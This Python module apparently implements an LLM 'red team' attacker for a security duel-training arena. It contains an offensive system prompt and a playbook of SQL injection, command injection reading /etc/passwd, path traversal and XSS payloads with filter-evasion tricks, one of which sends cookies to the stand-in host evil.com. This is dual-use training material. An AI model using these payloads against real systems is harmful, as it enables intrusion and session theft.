"""Red Team Attacker Agent for SecSkill Duel Arena."""
import json
from typing import Optional, Dict, Any, List
from secskill.duel.models import AttackPayload
from secskill.llm.ollama_provider import OllamaProvider
from secskill.llm.openai_provider import OpenAIProvider
from secskill.llm.anthropic_provider import AnthropicProvider

RED_SYSTEM_PROMPT = """You are an Elite Offensive Red Team Hacker in the SecSkill Duel Arena.
Your mission is to inspect the target code and craft sophisticated, realistic exploit payloads to bypass any filters, WAFs, or defensive patches.
Analyze the target code and prior referee feedback carefully.
Output ONLY a valid JSON object matching this schema:
{
  "name": "<short descriptive title of payload>",
  "vector": "<vulnerability CWE / category>",
  "payload": "<exact exploit string to inject>",
  "bypass_technique": "<e.g. WAF Evasion, Comment Trick, Hex Encoding, Nested Delimiters>",
  "explanation": "<concise explanation of how this exploit executes>"
}
"""

# Specialized multi-stage payload repository for simulation and offline execution
PAYLOAD_PLAYBOOK: Dict[str, List[Dict[str, str]]] = {
    "sqli": [
        {
            "name": "Classic Boolean Tautology",
            "vector": "CWE-89 SQL Injection",
            "payload": "admin' OR '1'='1' --",
            "bypass_technique": "Boolean Logic Tautology ('1'='1' evaluates TRUE)",
            "explanation": "Comments out trailing SQL conditions and forces the query to return true, granting administrative access.",
        },
        {
            "name": "Inline Comment WAF Bypass",
            "vector": "CWE-89 SQL Injection (WAF Evasion)",
            "payload": "admin'/**/OR/**/1=1#",
            "bypass_technique": "C-style Inline Comments (/**/) evading space-filtering regex",
            "explanation": "Replaces standard spaces with SQL comment tokens /**/ to circumvent naive space-splitting WAFs and filters.",
        },
        {
            "name": "Hexadecimal Encoding Evasion",
            "vector": "CWE-89 SQL Injection (Filter Bypass)",
            "payload": "admin' UNION SELECT 1,0x61646d696e,3--",
            "bypass_technique": "Hex literal 0x61646d696e ('admin') bypassing quote-stripping filters",
            "explanation": "Supplies string constants encoded in hex notation, avoiding single quotes and rendering quote-strippers useless.",
        },
        {
            "name": "Time-Based Blind Heavy Query",
            "vector": "CWE-89 SQL Injection (Blind Inference)",
            "payload": "1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--",
            "bypass_technique": "Asynchronous Subquery Sleep Injection",
            "explanation": "Triggers database thread suspension to infer data blindly without needing reflected output.",
        },
    ],
    "cmdi": [
        {
            "name": "Semicolon Command Chaining",
            "vector": "CWE-78 OS Command Injection",
            "payload": "; cat /etc/passwd",
            "bypass_technique": "Command Delimiter (;) Sequence",
            "explanation": "Terminates the intended command and chains arbitrary shell execution with full root/user privileges.",
        },
        {
            "name": "IFS Variable Whitespace Obfuscation",
            "vector": "CWE-78 OS Command Injection (WAF Evasion)",
            "payload": ";cat$IFS/etc/passwd",
            "bypass_technique": "Internal Field Separator ($IFS) whitespace substitution",
            "explanation": "Bypasses whitespace and parameter blacklists by exploiting the shell's internal token delimiter $IFS.",
        },
        {
            "name": "Subshell Backtick Command Substitution",
            "vector": "CWE-78 OS Command Injection (Execution)",
            "payload": "`id`",
            "bypass_technique": "POSIX Backtick Subshell Interpolation",
            "explanation": "Evaluates the enclosed command in a subshell before the parent command receives the arguments.",
        },
        {
            "name": "Environment Variable Hex Reassembly",
            "vector": "CWE-78 OS Command Injection (Advanced Evasion)",
            "payload": "127.0.0.1;$(echo${IFS}aWQ=|base64${IFS}-d)",
            "bypass_technique": "Base64 Decoded Pipe Execution",
            "explanation": "Decodes base64-encoded payloads dynamically in memory to evade string matching detection engines.",
        },
    ],
    "path-traversal": [
        {
            "name": "Standard Directory Traversal",
            "vector": "CWE-22 Path Traversal",
            "payload": "../../../../etc/passwd",
            "bypass_technique": "Relative Directory Stepping (../)",
            "explanation": "Navigates upward past the application document root to access sensitive operating system files.",
        },
        {
            "name": "Nested Double-Dot Evasion",
            "vector": "CWE-22 Path Traversal (Filter Bypass)",
            "payload": "....//....//....//etc/passwd",
            "bypass_technique": "Nested Dot-Dot-Slash (....//) recursive strip evasion",
            "explanation": "Defeats naive string filters that replace '../' once: removing '../' from '....//' yields an active '../'.",
        },
        {
            "name": "Percent URL Multi-Encoding",
            "vector": "CWE-22 Path Traversal (Encoding Evasion)",
            "payload": "%252e%252e%252fetc%252fpasswd",
            "bypass_technique": "Double Percent-Encoding (%252e)",
            "explanation": "Exploits multi-pass URL decoders in reverse proxies and application servers to slip traversal dots past filters.",
        },
        {
            "name": "Null Byte Path Truncation",
            "vector": "CWE-22 Path Traversal (Truncation)",
            "payload": "../../../../etc/passwd%00.png",
            "bypass_technique": "Null Byte (%00) Extension Truncation",
            "explanation": "Injects a null byte before the extension to terminate C string parsing while satisfying extension checks.",
        },
    ],
    "xss": [
        {
            "name": "Direct Script Tag Injection",
            "vector": "CWE-79 Cross-Site Scripting",
            "payload": "<script>alert(document.cookie)</script>",
            "bypass_technique": "Standard HTML Script Block",
            "explanation": "Forces immediate browser script interpretation to access session cookies and localStorage.",
        },
        {
            "name": "Case Variation & Event Handler Evasion",
            "vector": "CWE-79 Cross-Site Scripting (WAF Evasion)",
            "payload": "<sCrIpt/x>alert(1)</sCrIpt>",
            "bypass_technique": "Mixed-Case and Slash Delimiter Tag Mutation",
            "explanation": "Evades lowercase regex signatures and whitespace tokenizers by mutating tag casing and inserting slashes.",
        },
        {
            "name": "SVG Self-Executing Vector",
            "vector": "CWE-79 Cross-Site Scripting (Vector Shift)",
            "payload": "<svg/onload=fetch('//evil.com/'+document.cookie)>",
            "bypass_technique": "XML/SVG Inline onload Handler",
            "explanation": "Bypasses tag blacklists filtering <img> and <script> by utilizing modern HTML5 SVG graphics elements.",
        },
        {
            "name": "DOM Clobbering / Polyglot Payload",
            "vector": "CWE-79 Cross-Site Scripting (Polyglot)",
            "payload": "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
            "bypass_technique": "Universal Polyglot Context Escape",
            "explanation": "Escapes multiple nested HTML parsing contexts simultaneously (attributes, titles, scripts) in one shot.",
        },
    ],
}


class RedTeamAgent:
    """Attacker Agent that generates exploit payloads and bypasses."""

    def __init__(
        self,
        model_name: str = "codellama",
        provider_name: str = "ollama",
    ):
        self.model_name = model_name
        self.provider_name = provider_name
        self.llm_provider = self._init_provider()

    def _init_provider(self):
        if self.provider_name == "openai":
            return OpenAIProvider(model=self.model_name)
        elif self.provider_name == "anthropic":
            return AnthropicProvider(model=self.model_name)
        elif self.provider_name == "ollama":
            return OllamaProvider(model=self.model_name)
        return None

    def craft_exploit(
        self,
        code: str,
        vuln_type: str,
        round_number: int,
        referee_feedback: str = "",
    ) -> AttackPayload:
        """Craft an exploit payload using Local LLM or autonomous attack playbook."""
        # Try local LLM generation first if available
        if self.llm_provider and self.provider_name in ["ollama", "openai", "anthropic"]:
            try:
                user_prompt = (
                    f"Round: {round_number}\n"
                    f"Target Vulnerability: {vuln_type}\n"
                    f"Referee Feedback on Defense:\n{referee_feedback}\n\n"
                    f"Target Code:\n```\n{code}\n```\n\n"
                    f"Craft a bypass payload that breaks this defense. Remember to reply in valid JSON."
                )
                raw_response = self.llm_provider.generate(user_prompt, system_prompt=RED_SYSTEM_PROMPT)
                # Parse JSON from response
                parsed = self._extract_json(raw_response)
                if parsed and "payload" in parsed:
                    return AttackPayload(
                        name=parsed.get("name", f"LLM Exploit R{round_number}"),
                        vector=parsed.get("vector", f"CWE-{vuln_type.upper()}"),
                        payload=parsed.get("payload", "' OR '1'='1"),
                        bypass_technique=parsed.get("bypass_technique", "AI-Generated Bypass"),
                        explanation=parsed.get("explanation", "Exploit crafted to evade current filters."),
                    )
            except Exception:
                pass

        # Autonomous Playbook Fallback (Offline & High-Speed Determinism)
        return self._playbook_payload(vuln_type, round_number)

    def _extract_json(self, text: str) -> Optional[Dict[str, Any]]:
        try:
            # Search for JSON block
            if "{" in text and "}" in text:
                start = text.index("{")
                end = text.rindex("}") + 1
                return json.loads(text[start:end])
        except Exception:
            pass
        return None

    def _playbook_payload(self, vuln_type: str, round_number: int) -> AttackPayload:
        vuln_key = "sqli"
        vuln_lower = vuln_type.lower()
        if "cmd" in vuln_lower or "78" in vuln_lower:
            vuln_key = "cmdi"
        elif "path" in vuln_lower or "22" in vuln_lower:
            vuln_key = "path-traversal"
        elif "xss" in vuln_lower or "79" in vuln_lower:
            vuln_key = "xss"

        playbook = PAYLOAD_PLAYBOOK.get(vuln_key, PAYLOAD_PLAYBOOK["sqli"])
        idx = min(round_number - 1, len(playbook) - 1)
        item = playbook[idx]

        return AttackPayload(
            name=item["name"],
            vector=item["vector"],
            payload=item["payload"],
            bypass_technique=item["bypass_technique"],
            explanation=item["explanation"],
        )

